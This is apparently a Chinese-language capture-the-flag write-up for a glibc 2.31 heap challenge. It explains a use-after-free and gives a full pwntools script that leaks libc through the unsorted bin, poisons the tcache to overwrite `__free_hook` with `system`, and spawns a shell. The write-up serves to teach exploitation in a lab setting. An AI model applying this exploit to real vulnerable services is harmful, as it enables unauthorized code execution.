# Elden Ring Ⅱ

## 题目简述

程序提供堆块的申请、释放、编辑和查看功能，运行环境为 glibc 2.31。编辑功能允许操作已释放块，因而可以泄露 unsorted bin 指针并进行 tcache poisoning，最终把 `__free_hook` 改为 `system`，释放保存 `/bin/sh` 的块取得 shell。

## 解题过程

### 泄露 libc

先申请 8 个请求大小为 `0x90` 的块，再释放它们。glibc 2.31 的同尺寸 tcache 默认只能容纳 7 个条目，第 8 个块进入 unsorted bin。查看这个块即可取得 `main_arena` 指针；官方环境使用的偏移为 `0x1ecbe0`。

### 污染小尺寸 tcache

再利用两个 `0x20` 请求块和释放后编辑能力改写 tcache 单链表，使后续分配返回 `__free_hook`。把 `system` 写入该地址，并释放内容为 `/bin/sh\0` 的块。

核心操作序列如下，菜单封装应按附件提示补齐：

```python
from pwn import ELF, p64, remote, u64

HOST = "challenge.host"
PORT = 9999

io = remote(HOST, PORT)
libc = ELF("./libc.so.6")

# add(index, size)、delete(index)、edit(index, data)、show(index)
# 均为题目菜单的直接封装。

for index in range(8):
    add(index, 0x90)
add(8, 0x20)

for index in range(8):
    delete(index)

show(7)
arena_pointer = u64(io.recv(6).ljust(8, b"\x00"))
libc.address = arena_pointer - 0x1ECBE0

free_hook = libc.sym["__free_hook"]
system = libc.sym["system"]

add(9, 0x20)
add(10, 0x20)
delete(8)
delete(9)

# 释放后编辑：一个块保存命令，另一个块把 freelist next 指向 hook。
edit(10, b"/bin/sh\x00")
edit(9, p64(free_hook))

add(11, 0x20)
add(12, 0x20)
edit(12, p64(system))
delete(10)
io.interactive()
```

验证时应先确认泄露值属于 libc 且基址页对齐，再检查 `__free_hook` 的最终内容确实等于 `system`。该方法依赖 glibc 2.31 仍保留 malloc hooks；新版 glibc 已不再适用。

## 方法总结

- 核心技巧：填满 tcache 制造 unsorted bin 泄露，再利用 UAF 编辑完成 tcache poisoning。
- 识别信号：菜单允许查看或编辑已释放块，运行环境是仍包含 `__free_hook` 的 glibc 2.31。
- 复用要点：不同请求大小对应的真实 chunk size 要先确认；泄露偏移、tcache 防护和 hook 是否存在都与 libc 版本强相关。
